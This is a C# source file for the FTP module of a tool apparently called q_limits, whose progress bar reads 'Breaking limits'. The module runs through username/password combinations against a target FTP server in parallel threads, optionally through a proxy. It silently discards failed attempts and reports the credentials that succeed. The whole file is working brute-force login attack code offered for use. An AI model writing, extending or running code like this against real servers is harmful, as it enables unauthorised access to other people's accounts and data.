using System;
using System.Collections.Generic;
using System.Net;
using System.Threading.Tasks;
using Melodi.Networking;
using q_limits.CombinationProviders;
using q_limits.CombinationProviders.Impl;
using Spectre.Console;

namespace q_limits.Modules.Impl
{
    public class FTPModule : Module
    {
        private static readonly UsernamePasswordCombinationProvider combinationProvider = new();
        public FTPModule() : base("FTP", "ftp") { }
        public override ICombinationProvider GetCombinationProvider() => combinationProvider;

        public override void Load(CommandLineOptions options, ProgressContext progCtx)
        {
            WebProxy proxy = null;
            if (ProxyManager.ProxyRequired)
            {
                AnsiConsole.MarkupLine("[gray]Proxy detected[/]");
                if (options.Proxy != null)
                {
                    string[] splt = options.Proxy.Split(":", 2);
                    string username = splt[0];
                    string password = splt.Length > 1 ? splt[1] : "";

                    try
                    {
                        proxy = ProxyManager.GetWebProxy(new(username, password));
                    }
                    catch (Exception)
                    {
                        AnsiConsole.MarkupLine("[red]Proxy connect failed[/]");
                        return;
                    }
                }
                else
                {
                    try
                    {
                        proxy = ProxyManager.GetWebProxy();
                    }
                    catch (Exception)
                    {
                        AnsiConsole.MarkupLine("[red]Proxy connect failed[/]");
                        return;
                    }
                }
            }
            
            int combs = combinationProvider.GetCombinationCount();
            
            var mainTask = progCtx.AddTask("[gray][[Module]][/] Breaking limits", true, combs);
            ParallelExecutor.ForEachAsync(options.MaxThreadCount, combinationProvider.EnumerateCombinations(), x => 
            {
                try
                {
                    FtpWebRequest request = (FtpWebRequest)WebRequest.Create(options.Destination);
                    request.Proxy = proxy;
                    request.Credentials = new NetworkCredential(x.Username, x.Password);
                    request.Method = WebRequestMethods.Ftp.DownloadFile;

                    FtpWebResponse response = (FtpWebResponse)request.GetResponse();
                    response.Close();

                    ModuleService.ReportSuccess(options.Destination, x);
                }
                catch (Exception) { /* Don't Care */ }

                lock (mainTask)
                {
                    mainTask.Increment(1);
                }
                return Task.CompletedTask;
            }).GetAwaiter().GetResult();

            mainTask.Value = mainTask.MaxValue;
        }
    }
}
